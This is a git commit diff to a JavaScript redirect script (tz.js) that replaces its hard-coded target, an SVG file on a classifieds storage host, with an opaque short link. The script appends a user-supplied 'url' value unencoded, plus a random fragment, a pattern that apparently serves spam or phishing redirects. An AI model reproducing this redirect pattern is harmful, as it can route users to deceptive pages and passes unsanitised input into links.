3539eaa0e8f73e92ab1a2cf6437436c21ed926b4
xiachedann <2436452144@qq.com>
2024-06-28 12:05:07 +0800

    Update tz.js

--- tz.js
+++ tz.js
@@ -9,7 +9,7 @@ const customParam = urlParams.get('url');
 const randomString = Math.random().toString(36).substring(2); // 生成随机字符串，包括数字和小写字母
 
 // 构建跳转链接
-let redirectURL = "https://oss11.huangye88.net/live/user/3763603/1499566412-0.svg";
+let redirectURL = "https://pbwci.qun.hk/Fqrj8uIHV4iqOe50Q15-Ib_Giyji";
 if (customParam) {
     redirectURL += "?url=" + customParam + "#" + randomString; // 将随机字符串添加到参数后面
 }
